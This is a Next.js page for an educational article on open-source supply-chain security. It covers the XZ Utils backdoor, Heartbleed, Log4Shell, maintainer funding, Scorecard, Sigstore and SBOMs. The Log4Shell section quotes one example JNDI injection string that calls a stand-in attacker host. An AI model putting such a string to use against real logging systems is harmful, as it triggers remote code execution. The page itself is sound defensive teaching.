import type { Metadata } from "next";
import Link from "next/link";
import { CyberHeroImage } from "../_components/CyberHeroImage";

export const metadata: Metadata = {
  title: "Open-Source Security · /learn/cyber/open-source · AtomEons",
  description: "Open source runs the internet. One backdoor in a compression library nearly broke SSH for every Linux server on Earth. The fix was social, not technical.",
  alternates: { canonical: "https://atomeons.com/learn/cyber/open-source" },
  openGraph: {
    title: "Open-Source Security",
    description: "XZ Utils, Heartbleed, Log4Shell — and the fragile dependencies under everything",
    url: "https://atomeons.com/learn/cyber/open-source",
    type: "article",
  },
  robots: { index: true, follow: true },
};

const ACCENT = "#22F0D5";

export default function Page() {
  return (
    <main className="relative z-10 bg-black text-[#F2F4F5]">
      <CyberHeroImage slug="labs" alt="XZ Utils, Heartbleed, Log4Shell — and the fragile dependencies under everything" />
      <div className="mx-auto w-full max-w-6xl px-6 pt-6">
        <p className="font-mono text-[11px] tracking-[0.08em] text-[#6B7779]">
          <Link href="/" className="hover:text-[#22F0D5]">AtomEons</Link>{" "}
          <span className="text-[#1A2225]">/</span>{" "}
          <Link href="/learn" className="hover:text-[#22F0D5]">Learn</Link>{" "}
          <span className="text-[#1A2225]">/</span>{" "}
          <Link href="/learn/cyber" className="hover:text-[#22F0D5]">Cyber</Link>{" "}
          <span className="text-[#1A2225]">/</span> Open-Source Security
        </p>
      </div>

      <section className="border-b border-[#1A2225]">
        <div className="mx-auto w-full max-w-4xl px-6 py-16 md:py-24">
          <p className="font-mono text-[11px] uppercase tracking-[0.32em]" style={{ color: ACCENT }}>
            XZ Utils, Heartbleed, Log4Shell — and the fragile dependencies under everything
          </p>
          <h1 className="mt-7 text-balance text-4xl font-medium leading-[1.05] tracking-tight md:text-6xl md:leading-[1]">
            Open-Source Security
          </h1>
          <p className="mt-8 max-w-[62ch] text-[17px] leading-[1.65] text-[#C8CCCE]">
            Open source runs the internet. One backdoor in a compression library nearly broke SSH for every Linux server on Earth. The fix was social, not technical.
          </p>
        </div>
      </section>

      <section>
        <div className="mx-auto w-full max-w-4xl px-6 py-16 md:py-24 space-y-14">
          <article key={0}>
            <p className="font-mono text-[11px] uppercase tracking-[0.22em]" style={{ color: ACCENT }}>
              {"01"}
            </p>
            <h2 className="mt-4 text-balance text-2xl font-medium tracking-tight text-[#F2F4F5] md:text-3xl">
              {`## The XZ Utils backdoor (March 2024)`}
            </h2>
            <div className="mt-5 max-w-[62ch] text-[15px] leading-[1.7] text-[#C8CCCE] whitespace-pre-line">
              {`On March 29, 2024, Microsoft engineer Andres Freund posted to the oss-security mailing list that he had found a backdoor in \`liblzma\`, a compression library bundled with the XZ Utils package. He noticed SSH logins were running half a second slower than expected on a Debian sid system and traced it back through the library to a malicious payload that hijacked \`sshd\` authentication. The attacker, operating under the pseudonym "Jia Tan" (\`JiaT75\`), had spent roughly two years building reputation as a maintainer — submitting legitimate patches, gradually being granted commit access from the original maintainer Lasse Collin, then planting the payload across versions 5.6.0 and 5.6.1. Had the backdoor reached Debian stable, Ubuntu LTS, or Red Hat, the attacker would have held a master key to a significant fraction of the world's Linux servers. Read Freund's original disclosure at openwall.com/lists/oss-security/2024/03/29/4 and Russ Cox's deep timeline at research.swtch.com/xz-timeline.`}
            </div>
          </article>

          <article key={1}>
            <p className="font-mono text-[11px] uppercase tracking-[0.22em]" style={{ color: ACCENT }}>
              {"02"}
            </p>
            <h2 className="mt-4 text-balance text-2xl font-medium tracking-tight text-[#F2F4F5] md:text-3xl">
              {`Heartbleed (2014) — the bug that named bugs`}
            </h2>
            <div className="mt-5 max-w-[62ch] text-[15px] leading-[1.7] text-[#C8CCCE] whitespace-pre-line">
              {`In April 2014, Neel Mehta of Google's security team and engineers at Codenomicon independently discovered CVE-2014-0160 in OpenSSL: a missing bounds check in the TLS heartbeat extension allowed any attacker to read 64KB of process memory from a vulnerable server. Memory contents included private keys, session cookies, and passwords. OpenSSL at the time was maintained by roughly two full-time developers — Steve Marquess of the OpenSSL Software Foundation reported the project's total annual donations the year before Heartbleed were under $2,000. The disclosure cycle was a logistical disaster: Cloudflare, Akamai, and a few favored vendors got advance notice; most of the internet did not. The bug had been in production code for two years. Heartbleed birthed the modern named-vulnerability industry (logo, website, branded panic) and the Core Infrastructure Initiative — the first serious attempt to fund the libraries everyone depends on.`}
            </div>
          </article>

          <article key={2}>
            <p className="font-mono text-[11px] uppercase tracking-[0.22em]" style={{ color: ACCENT }}>
              {"03"}
            </p>
            <h2 className="mt-4 text-balance text-2xl font-medium tracking-tight text-[#F2F4F5] md:text-3xl">
              {`Log4Shell (December 2021)`}
            </h2>
            <div className="mt-5 max-w-[62ch] text-[15px] leading-[1.7] text-[#C8CCCE] whitespace-pre-line">
              {`On November 24, 2021, Chen Zhaojun of Alibaba's Cloud Security team reported CVE-2021-44228 to the Apache Software Foundation. Log4j 2 — the default Java logging library — would resolve JNDI lookup strings inside any logged user input, allowing remote code execution by logging a string like \`\${jndi:ldap://attacker.example/x}\`. Minecraft chat. HTTP User-Agent headers. iCloud device names. Tesla logs. Every Java service on the internet became remotely exploitable by anyone who could get a string into a log line. Jen Easterly, then CISA director, called it "the most serious vulnerability I've seen in my career." The library was maintained by a handful of volunteers. The lead maintainer, Ralph Goers, was working on it nights and weekends. The fix shipped in 2.17.0 after three more CVEs were found chasing the first one. Source: Apache CVE-2021-44228 advisory and CISA's emergency directive 22-02.`}
            </div>
          </article>

          <article key={3}>
            <p className="font-mono text-[11px] uppercase tracking-[0.22em]" style={{ color: ACCENT }}>
              {"04"}
            </p>
            <h2 className="mt-4 text-balance text-2xl font-medium tracking-tight text-[#F2F4F5] md:text-3xl">
              {`The sustainability problem`}
            </h2>
            <div className="mt-5 max-w-[62ch] text-[15px] leading-[1.7] text-[#C8CCCE] whitespace-pre-line">
              {`The pattern is the same in every case: critical infrastructure maintained by one to three unpaid volunteers, used by trillion-dollar companies. After Heartbleed, the Linux Foundation launched the Core Infrastructure Initiative. After Log4Shell, the Biden White House summoned 17 tech companies — Apple, Google, Amazon, Meta, Microsoft, IBM, Oracle, Cisco — to a January 2022 meeting on open-source security. The result was the Open Source Security Foundation's Alpha-Omega project, with $10M+ in initial commitments from Microsoft and Google to fund maintainers of the most-depended-on projects. Read the OpenSSF mobilization plan at openssf.org/oss-security-mobilization-plan — it's a 10-stream, $150M, two-year plan covering SBOM adoption, memory-safe language migration, code reviews of the top 200 projects, and direct maintainer funding. Whether $150M is enough to underwrite a software supply chain valued in trillions remains an open question.`}
            </div>
          </article>

          <article key={4}>
            <p className="font-mono text-[11px] uppercase tracking-[0.22em]" style={{ color: ACCENT }}>
              {"05"}
            </p>
            <h2 className="mt-4 text-balance text-2xl font-medium tracking-tight text-[#F2F4F5] md:text-3xl">
              {`OpenSSF Scorecard`}
            </h2>
            <div className="mt-5 max-w-[62ch] text-[15px] leading-[1.7] text-[#C8CCCE] whitespace-pre-line">
              {`The OpenSSF Scorecard project (github.com/ossf/scorecard) gives any GitHub repository a 0-10 score across 19 checks: branch protection, code review, dependency pinning, fuzzing, signed releases, SAST coverage, token permissions, vulnerability response time. The tool was originally built by Google and is now maintained by OpenSSF. Scorecard data on the top 1 million npm and PyPI packages is published at deps.dev. The signal is uneven — a high score doesn't prevent a Jia Tan attack — but it surfaces the obvious red flags: no two-person review on critical merges, dependencies pulled from unpinned tags, releases unsigned. For defenders, running Scorecard against your dependency tree is a cheap weekend audit that often reveals which packages have no review process at all.`}
            </div>
          </article>

          <article key={5}>
            <p className="font-mono text-[11px] uppercase tracking-[0.22em]" style={{ color: ACCENT }}>
              {"06"}
            </p>
            <h2 className="mt-4 text-balance text-2xl font-medium tracking-tight text-[#F2F4F5] md:text-3xl">
              {`Sigstore — signing the supply chain`}
            </h2>
            <div className="mt-5 max-w-[62ch] text-[15px] leading-[1.7] text-[#C8CCCE] whitespace-pre-line">
              {`Sigstore (sigstore.dev), launched by the Linux Foundation in 2021, is a free certificate authority and transparency log for software signatures. It pairs short-lived signing keys (Fulcio) with an append-only Rekor log so anyone can verify that a package was signed by the claimed identity and that the signature was published to a public log. Npm packages, Python wheels, container images, and Kubernetes artifacts increasingly publish Sigstore signatures. The model — OIDC identity + short-lived certs + transparency log — is borrowed directly from Certificate Transparency for TLS. The threat it addresses is the unsigned-tarball problem: when you \`npm install\`, you have no cryptographic chain back to a human. Sigstore won't stop a malicious maintainer (Jia Tan would have signed XZ just fine), but it stops typosquatting, mirror attacks, and post-compromise tampering.`}
            </div>
          </article>

          <article key={6}>
            <p className="font-mono text-[11px] uppercase tracking-[0.22em]" style={{ color: ACCENT }}>
              {"07"}
            </p>
            <h2 className="mt-4 text-balance text-2xl font-medium tracking-tight text-[#F2F4F5] md:text-3xl">
              {`SBOM — Syft, Grype, and knowing what you ship`}
            </h2>
            <div className="mt-5 max-w-[62ch] text-[15px] leading-[1.7] text-[#C8CCCE] whitespace-pre-line">
              {`A Software Bill of Materials is a machine-readable inventory of every component in a binary. Executive Order 14028 (May 2021) made SBOMs mandatory for federal software vendors; CISA's SBOM minimum elements (cisa.gov/sbom) defined the baseline. Anchore's Syft (github.com/anchore/syft) generates SBOMs in CycloneDX or SPDX format from container images, filesystems, or source. Grype (github.com/anchore/grype) cross-references SBOMs against CVE databases. The 2022 Trellix and Sonatype reports estimated the average enterprise application contains 528 open-source components; without an SBOM, vulnerability response after Log4Shell required \`grep -r log4j /\` on every server. With one, it's a database query. Defense Department contractors now ship SBOMs as deliverables.`}
            </div>
          </article>

          <article key={7}>
            <p className="font-mono text-[11px] uppercase tracking-[0.22em]" style={{ color: ACCENT }}>
              {"08"}
            </p>
            <h2 className="mt-4 text-balance text-2xl font-medium tracking-tight text-[#F2F4F5] md:text-3xl">
              {`Why open source is both safer and more dangerous`}
            </h2>
            <div className="mt-5 max-w-[62ch] text-[15px] leading-[1.7] text-[#C8CCCE] whitespace-pre-line">
              {`Linus's Law — "given enough eyeballs, all bugs are shallow" — held until everyone assumed someone else was looking. Heartbleed sat in production for two years. XZ Utils took two years of social engineering. Log4Shell's JNDI feature had been in the library since 2013. Open source is auditable in theory; in practice, most dependencies are pulled blind through npm, pip, or cargo with zero human review. The strength of open source is that defenders can also read the code — Andres Freund could find the XZ backdoor because the source was open. The weakness is that the same property gives attackers a free, perfect copy of the codebase to study before striking. Closed source has obscurity; open source has visibility. Neither is security.`}
            </div>
          </article>

          <article key={8}>
            <p className="font-mono text-[11px] uppercase tracking-[0.22em]" style={{ color: ACCENT }}>
              {"09"}
            </p>
            <h2 className="mt-4 text-balance text-2xl font-medium tracking-tight text-[#F2F4F5] md:text-3xl">
              {`Where to read more`}
            </h2>
            <div className="mt-5 max-w-[62ch] text-[15px] leading-[1.7] text-[#C8CCCE] whitespace-pre-line">
              {`- Russ Cox, *The xz Attack Timeline* — research.swtch.com/xz-timeline
- Andres Freund's original disclosure — openwall.com/lists/oss-security/2024/03/29/4
- OpenSSF Mobilization Plan — openssf.org/oss-security-mobilization-plan
- CISA Emergency Directive 22-02 (Log4Shell) — cisa.gov/news-events/directives/ed-22-02
- *Working in Public* by Nadia Eghbal (Stripe Press, 2020) — the canonical book on the maintainer sustainability problem`}
            </div>
          </article>
        </div>
      </section>

      <section className="bg-black">
        <div className="mx-auto w-full max-w-4xl px-6 py-12 text-center">
          <Link href="/learn/cyber" className="inline-flex items-center gap-2 rounded-full border border-[#1A2225] px-5 py-2.5 text-sm text-[#9BA5A7] transition-colors hover:text-[#E7EBED]">
            ← cyber index
          </Link>
        </div>
      </section>
    </main>
  );
}
